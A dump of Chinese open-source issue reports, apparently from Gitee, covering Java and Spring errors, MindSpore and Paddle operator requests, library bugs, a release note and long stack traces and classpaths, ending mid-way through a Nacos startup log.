~[forest-core-1.5.21.jar:na] at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~ at com.dtflys.forest.reflection.ForestMethod.getAnnotationLifeCycleClassMap(ForestMethod.java:308) ~ 进程已结束,退出代码1 package com.example.forest.client import com.dtflys.forest.annotation.BaseRequest import com.dtflys.forest.annotation.Get import com.dtflys.forest.annotation.Var import org.springframework.stereotype.Component @Component @BaseRequest(sslProtocol = ""SSL"") interface Tencent { @Get( ""https://ssl.ptlogin2.qq.com/ptqrshow?appid=715030901&amp;e=2&amp;l=M&amp;s=3&amp;d=72&amp;v=4&amp;t=0.{time}&amp;daid=73&amp;pt_3rd_aid=0"" ) fun qqLoginQr(@Var(value = ""time"") time: String):ByteArray }"
【众智】【计算-GPU开发】Bucketize,"根据边界对输入进行桶分化。 x y boundaries list_float 属性 对应底层算子 Classify Name Type Type Range Required INPUT x int32, int64, double, float32 TRUE OUTPUT y int32 TRUE REQUIRED_ATTR boundaries tensor(一维) float TRUE 标杆接口参考 Pytorch接口： https://pytorch.org/docs/1.8.1/generated/torch.bucketize.html?highlight=bucket#torch.bucketize 3. 异常处理 4. 算子反向 无反向   <code>: class Bucketize(Primitive):"
 使用ExcelWriter.addSelect() 添加下拉列表 无效,"JDK版本： openjdk_8_201 hutool版本： 5.1.2 代码运行后，下载的Excel打开没有下拉框，代码不报错。 无 测试结果：   <code>: @RequestMapping(value = ""template-down"") public void templateDown(HttpServletResponse response) { ExcelWriter writer = ExcelUtil.getWriter(); ServletOutputStream out = null; try { out = response.getOutputStream(); List rows = new ArrayList&lt;&gt;(); writer.writeCellValue(0, 0, ""请选择科目""); int firstRow = 0; int lastRow = 0; int firstCol = 0; int lastCol = 0; CellRangeAddressList addressList = new CellRangeAddressList(firstRow, lastRow, firstCol, lastCol); writer = writer.addSelect(addressList, ""1001"", ""1002"", ""1003""); writer.write(rows, true); response.setContentType(""application/vnd.ms-excel;charset=utf-8""); response.setHeader(""Content-Disposition"", ""attachment;filename=signup-template.xls""); response.setCharacterEncoding(""UTF-8""); } catch (Exception e) { LogUtil.error(""异常信息：{}"", e); } finally { writer.flush(out, true); writer.close(); IoUtil.close(out); } }"
Media.MediaType不包含news类型，无法获取news素材,"Media.MediaType不包含news类型，无法获取news素材 看MediaType类型定义如下 batchGetMaterial函数定义如下：   <code>: /** * 上传的临时多媒体文件有格式 * 分别有图片（image）、语音（voice）、视频（video）和缩略图（thumb） */ public static enum MediaType { IMAGE, VOICE, VIDEO, THUMB; // 转化成小写形式 public String get() { return this.name().toLowerCase(); } } /** * 获取素材列表 * @param mediaType 素材的类型，图片（image）、视频（video）、语音 （voice）、图文（news） * @param offset 从全部素材的该偏移位置开始返回，0表示从第一个素材 返回 * @param count 返回素材的数量，取值在1到20之间 * @return ApiResult 返回信息 */ public static ApiResult batchGetMaterial(MediaType mediaType, int offset, int count)"
 发布 Furion v4.7.1 版本,发布 和 和 版本 包含以下功能更新： 功能清单 新增 输出 ， 和 <sup>4.7.1</sup> aeda902 调整 日志记录时间格式默认输出带 的毫秒值 <sup>4.7.1</sup> aeda902 发布 版本文档 更新 示例项目 依赖至 版本 Replit 网站 案例同步到 版本 和 发布 版本 同步更新日志 !636: 发布 Furion v4.7.1 版本 aeda902 48c8902   <code>: Furion Furion.Tools Furion.Xunit v4.7.1 LoggingMonitor 系统信息 .NET 架构 基础框架 7位 v4.7.1 samples v4.7.1 Furion v4.7.1 Gitee Github Release-v4.7.1
对于get请求实体类型的参数，调试时请求参数不对的问题,"使用版本： 代码： 复现问题： 请问有没有什么好的方法修复这个问题？   <code>: &lt;!-- https://mvnrepository.com/artifact/org.springdoc/springdoc-openapi-ui --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springdoc&lt;/groupId&gt; &lt;artifactId&gt;springdoc-openapi-ui&lt;/artifactId&gt; &lt;version&gt;1.6.11&lt;/version&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/com.github.xiaoymin/knife4j-springdoc-ui --&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-springdoc-ui&lt;/artifactId&gt; &lt;version&gt;3.0.3&lt;/version&gt; &lt;/dependency&gt; @Operation(summary = ""用户信息分页查询"") @GetMapping ReturnResult&lt;PageUtil&lt;UserResponse&gt;&gt; page(HttpServletRequest request, UserQuery query)"
Expectation about dynamic attributes setting.,"以下是用constant op动态设置attribute的例子： 或者，为了让语法更简单，我们可以隐式的构造constant op和feed操作，python端语法设想如下：   <code>: image = fluid.layers.data(name="""", shape=[512, 512, 3], dtype="""") crop_attrs = fluid.constant(shape=[2, 3], dtype='int64') croped_img = fluid.layers.crop(input=image, attrs=crop_attrs) for batch_data in batches: offsets = randint([3]) exe.run( fluid.default_main_program(), feed={ ""crop_attrs"": [[4, 4, 3], offsets], }) image = fluid.layers.data(name="""", shape=[512, 512, 3], dtype="""") croped_img = fluid.layers.crop(input=image, shape=[4, 4, 3]) // 隐式地为attributes构造一个constant input layer ‘crop_attrs’ for batch_data in batches: croped_img.offsets = randint([3]) // 隐式的feed ‘crop_attrs’ exe.run( fluid.default_main_program(), )"
导出功能出错导出excel为空,"环境idea,jdk 1.8 maven 3.6.3 系统是Mac 部署项目直接用的git clone 原仓库 未有任何更改 用项目本身的自带功能导出出错 日志如下：   <code>: 23:17:34.209 [http-nio-80-exec-24] ERROR c.r.w.c.c.CommonController - [fileDownload,64] - 下载文件失败 java.io.FileNotFoundException: /Users/tai//upload/download/c7e37073-1696-4090-b3e8-4c3bbd447174_角色数据.xlsx at com.ruoyi.common.utils.file.FileUtils.writeBytes(FileUtils.java:36) at com.ruoyi.web.controller.common.CommonController.fileDownload(CommonController.java:56) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:189) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:634) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:741) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:112) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:449) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:791) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1417) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)"
【众智】【计算-TBE接入】HSigmoidGrad,"已有接口, 接口目录：mindspore/ops/operations/_grad_ops.py grads input_x output alpha属性：与input_x相乘的系数，算子信息注册设置默认值：0.16666666 beta属性：与input_x相加的系数，算子信息注册设置默认值：0.5 对应底层算子 对应底层AI Core算子HardSigmoidGrad   <code>: class HSigmoidGrad(Primitive):"
在使用pg数据库时报错,"PSQLException: ERROR: column ""create_time"" is of type timestamp without time zone but expression is of type character varying 网上解决方法：需要在连接后面加上 ?stringtype=unspecified   <code>: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.github.alenfive.rocketapi.datasource.factory.PostgreSQLFactory' available at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:351) at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBean(DefaultListableBeanFactory.java:342) at org.springframework.context.support.AbstractApplicationContext.getBean(AbstractApplicationContext.java:1126)"
【众智】【计算-AICPU开发】NanMedian,"NanMedian AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 计算中位数，忽略nan functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py 对应底层算子 对应底层AI CPU算子Median PyTorch1.8.1接口： torch.nanmedian https://pytorch.org/docs/1.8.1/generated/torch.nanmedian.html 3. 异常处理 4. 算子反向   <code>: def nanmedian(x, axis=-1, keepdim=False) -&gt; tensor: return y class Median(Primitive): REG_OP(Median) .INPUT(x, TensorType({ DT_INT16, DT_INT32, DT_INT64, DT_FLOAT, DT_DOUBLE})) .OUTPUT(y, TensorType({ DT_INT16, DT_INT32, DT_INT64, DT_FLOAT, DT_DOUBLE})) .OPTIONAL_OUTPUT(indices, TensorType({ DT_INT32, DT_INT64 )) .REQUIRED_ATTR(global_median, Bool) .ATTR(axis, Int, 0) .ATTR(keepdim, Bool, False) .ATTR(ignore_nan, Bool, False) .OP_END_FACTORY_REG(Bernoulli)"
pigx3.8 部署后无法启动Nacos,"环境信息 pigx版本: 3.8吧,5/18刚刚下载的 是否修改包名: 无，没有修改 1.按教程步骤部署 2.成功添加db下数据 增量3.7_3.8.sql (这次没有添加) 3.运行PigxNacosApplication 参考文档：https://pig4cloud.com/doc/pigx/pigx-deploy 完整的日志及日志截图如下：   <code>: ""C:\Program Files\Java\jdk1.8.0_231\bin\java.exe"" -XX:TieredStopAtLevel=1 -noverify -Dspring.output.ansi.enabled=always -Dcom.sun.management.jmxremote -Dspring.jmx.enabled=true -Dspring.liveBeansView.mbeanDomain -Dspring.application.admin.enabled=true ""-javaagent:D:\Ide\IntelliJ IDEA\lib\idea_rt.jar=6204:D:\Ide\IntelliJ IDEA\bin"" -Dfile.encoding=UTF-8 -classpath ""C:\Program Files\Java\jdk1.8.0_231\jre\lib\charsets.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\deploy.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\access-bridge-64.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\cldrdata.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\dnsns.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\jaccess.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\jfxrt.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\localedata.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\nashorn.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\sunec.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\sunjce_provider.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\sunmscapi.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\sunpkcs11.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\ext\zipfs.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\javaws.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\jce.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\jfr.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\jfxswt.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\jsse.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\management-agent.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\plugin.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\resources.jar;C:\Program Files\Java\jdk1.8.0_231\jre\lib\rt.jar;D:\workshop\ideapro\pigx-3.8\pigx\pigx-register\target\classes;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-config\1.2.1\nacos-config-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-web\2.2.6.RELEASE\spring-boot-starter-web-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-json\2.2.6.RELEASE\spring-boot-starter-json-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\datatype\jackson-datatype-jdk8\2.10.3\jackson-datatype-jdk8-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\module\jackson-module-parameter-names\2.10.3\jackson-module-parameter-names-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-validation\2.2.6.RELEASE\spring-boot-starter-validation-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\jakarta\validation\jakarta.validation-api\2.0.2\jakarta.validation-api-2.0.2.jar;C:\Users\ZhouYu\.m2\repository\org\hibernate\validator\hibernate-validator\6.0.18.Final\hibernate-validator-6.0.18.Final.jar;C:\Users\ZhouYu\.m2\repository\org\jboss\logging\jboss-logging\3.4.1.Final\jboss-logging-3.4.1.Final.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\classmate\1.5.1\classmate-1.5.1.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-web\5.2.5.RELEASE\spring-web-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-webmvc\5.2.5.RELEASE\spring-webmvc-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-api\1.2.1\nacos-api-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-core\1.2.1\nacos-core-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-common\1.2.1\nacos-common-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\org\reflections\reflections\0.9.11\reflections-0.9.11.jar;C:\Users\ZhouYu\.m2\repository\org\javassist\javassist\3.21.0-GA\javassist-3.21.0-GA.jar;C:\Users\ZhouYu\.m2\repository\com\google\guava\guava\28.2-android\guava-28.2-android.jar;C:\Users\ZhouYu\.m2\repository\com\google\guava\failureaccess\1.0.1\failureaccess-1.0.1.jar;C:\Users\ZhouYu\.m2\repository\com\google\guava\listenablefuture\9999.0-empty-to-avoid-conflict-with-guava\listenablefuture-9999.0-empty-to-avoid-conflict-with-guava.jar;C:\Users\ZhouYu\.m2\repository\com\google\code\findbugs\jsr305\3.0.2\jsr305-3.0.2.jar;C:\Users\ZhouYu\.m2\repository\org\checkerframework\checker-compat-qual\2.5.5\checker-compat-qual-2.5.5.jar;C:\Users\ZhouYu\.m2\repository\com\google\errorprone\error_prone_annotations\2.3.4\error_prone_annotations-2.3.4.jar;C:\Users\ZhouYu\.m2\repository\com\google\j2objc\j2objc-annotations\1.3\j2objc-annotations-1.3.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-jdbc\2.2.6.RELEASE\spring-boot-starter-jdbc-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\com\zaxxer\HikariCP\3.4.2\HikariCP-3.4.2.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-jdbc\5.2.5.RELEASE\spring-jdbc-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\commons-io\commons-io\2.2\commons-io-2.2.jar;C:\Users\ZhouYu\.m2\repository\commons-lang\commons-lang\2.6\commons-lang-2.6.jar;C:\Users\ZhouYu\.m2\repository\mysql\mysql-connector-java\8.0.19\mysql-connector-java-8.0.19.jar;C:\Users\ZhouYu\.m2\repository\commons-dbcp\commons-dbcp\1.4\commons-dbcp-1.4.jar;C:\Users\ZhouYu\.m2\repository\commons-pool\commons-pool\1.6\commons-pool-1.6.jar;C:\Users\ZhouYu\.m2\repository\org\apache\derby\derby\10.14.2.0\derby-10.14.2.0.jar;C:\Users\ZhouYu\.m2\repository\ch\qos\logback\logback-classic\1.2.3\logback-classic-1.2.3.jar;C:\Users\ZhouYu\.m2\repository\org\aspectj\aspectjrt\1.9.5\aspectjrt-1.9.5.jar;C:\Users\ZhouYu\.m2\repository\cglib\cglib-nodep\2.1\cglib-nodep-2.1.jar;C:\Users\ZhouYu\.m2\repository\org\apache\httpcomponents\httpasyncclient\4.1.4\httpasyncclient-4.1.4.jar;C:\Users\ZhouYu\.m2\repository\org\apache\httpcomponents\httpcore-nio\4.4.13\httpcore-nio-4.4.13.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-tomcat\2.2.6.RELEASE\spring-boot-starter-tomcat-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\jakarta\annotation\jakarta.annotation-api\1.3.5\jakarta.annotation-api-1.3.5.jar;C:\Users\ZhouYu\.m2\repository\org\apache\tomcat\embed\tomcat-embed-websocket\9.0.33\tomcat-embed-websocket-9.0.33.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\core\jackson-core\2.10.3\jackson-core-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\core\jackson-databind\2.10.3\jackson-databind-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\com\fasterxml\jackson\core\jackson-annotations\2.10.3\jackson-annotations-2.10.3.jar;C:\Users\ZhouYu\.m2\repository\org\apache\commons\commons-lang3\3.9\commons-lang3-3.9.jar;C:\Users\ZhouYu\.m2\repository\io\micrometer\micrometer-registry-prometheus\1.3.6\micrometer-registry-prometheus-1.3.6.jar;C:\Users\ZhouYu\.m2\repository\io\prometheus\simpleclient_common\0.7.0\simpleclient_common-0.7.0.jar;C:\Users\ZhouYu\.m2\repository\io\micrometer\micrometer-registry-influx\1.3.6\micrometer-registry-influx-1.3.6.jar;C:\Users\ZhouYu\.m2\repository\io\micrometer\micrometer-registry-elastic\1.3.6\micrometer-registry-elastic-1.3.6.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot-starter-aop\2.2.6.RELEASE\spring-boot-starter-aop-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\aspectj\aspectjweaver\1.9.5\aspectjweaver-1.9.5.jar;C:\Users\ZhouYu\.m2\repository\org\apache\tomcat\embed\tomcat-embed-jasper\7.0.59\tomcat-embed-jasper-7.0.59.jar;C:\Users\ZhouYu\.m2\repository\org\apache\tomcat\embed\tomcat-embed-core\9.0.33\tomcat-embed-core-9.0.33.jar;C:\Users\ZhouYu\.m2\repository\org\apache\tomcat\tomcat-annotations-api\9.0.33\tomcat-annotations-api-9.0.33.jar;C:\Users\ZhouYu\.m2\repository\org\apache\tomcat\embed\tomcat-embed-el\9.0.33\tomcat-embed-el-9.0.33.jar;C:\Users\ZhouYu\.m2\repository\org\eclipse\jdt\core\compiler\ecj\4.4\ecj-4.4.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-naming\1.2.1\nacos-naming-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\com\alibaba\fastjson\1.2.67\fastjson-1.2.67.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-all\4.1.48.Final\netty-all-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\com\ning\async-http-client\1.7.17\async-http-client-1.7.17.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty\3.6.6.Final\netty-3.6.6.Final.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\boot\spring-boot\2.2.6.RELEASE\spring-boot-2.2.6.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\org\springframework\spring-context\5.2.5.RELEASE\spring-context-5.2.5.RELEASE.jar;C:\Users\ZhouYu\.m2\repository\commons-collections\commons-collections\3.2.2\commons-collections-3.2.2.jar;C:\Users\ZhouYu\.m2\repository\org\codehaus\jackson\jackson-core-asl\1.9.10\jackson-core-asl-1.9.10.jar;C:\Users\ZhouYu\.m2\repository\org\slf4j\slf4j-api\1.7.30\slf4j-api-1.7.30.jar;C:\Users\ZhouYu\.m2\repository\ch\qos\logback\logback-core\1.2.3\logback-core-1.2.3.jar;C:\Users\ZhouYu\.m2\repository\org\apache\mina\mina-core\2.0.0-RC1\mina-core-2.0.0-RC1.jar;C:\Users\ZhouYu\.m2\repository\org\javatuples\javatuples\1.2\javatuples-1.2.jar;C:\Users\ZhouYu\.m2\repository\org\apache\httpcomponents\httpcore\4.4.13\httpcore-4.4.13.jar;C:\Users\ZhouYu\.m2\repository\org\apache\httpcomponents\httpclient\4.5.12\httpclient-4.5.12.jar;C:\Users\ZhouYu\.m2\repository\commons-codec\commons-codec\1.13\commons-codec-1.13.jar;C:\Users\ZhouYu\.m2\repository\org\slf4j\log4j-over-slf4j\1.7.30\log4j-over-slf4j-1.7.30.jar;C:\Users\ZhouYu\.m2\repository\org\slf4j\jcl-over-slf4j\1.7.30\jcl-over-slf4j-1.7.30.jar;C:\Users\ZhouYu\.m2\repository\org\slf4j\jul-to-slf4j\1.7.30\jul-to-slf4j-1.7.30.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-cmdb\1.2.1\nacos-cmdb-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-istio\1.2.1\nacos-istio-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\com\pig4cloud\nacos\nacos-client\1.2.1\nacos-client-1.2.1.jar;C:\Users\ZhouYu\.m2\repository\io\prometheus\simpleclient\0.5.0\simpleclient-0.5.0.jar;C:\Users\ZhouYu\.m2\repository\org\yaml\snakeyaml\1.25\snakeyaml-1.25.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-netty\1.27.2\grpc-netty-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\io\grpc\grpc-core\1.27.2\grpc-core-1.27.2.jar;C:\Users\ZhouYu\.m2\repository\com\google\code\gson\gson\2.8.6\gson-2.8.6.jar;C:\Users\ZhouYu\.m2\repository\com\google\android\annotations\4.1.1.4\annotations-4.1.1.4.jar;C:\Users\ZhouYu\.m2\repository\io\perfmark\perfmark-api\0.19.0\perfmark-api-0.19.0.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-codec-http2\4.1.48.Final\netty-codec-http2-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-buffer\4.1.48.Final\netty-buffer-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-transport\4.1.48.Final\netty-transport-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-resolver\4.1.48.Final\netty-resolver-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-codec\4.1.48.Final\netty-codec-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-handler\4.1.48.Final\netty-handler-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-codec-http\4.1.48.Final\netty-codec-http-4.1.48.Final.jar;C:\Users\ZhouYu\.m2\repository\io\netty\netty-handler-proxy\4.1.48.Final\netty-handler-proxy-4.1.48.Final.jar;C:\Users\ZhouYu\.m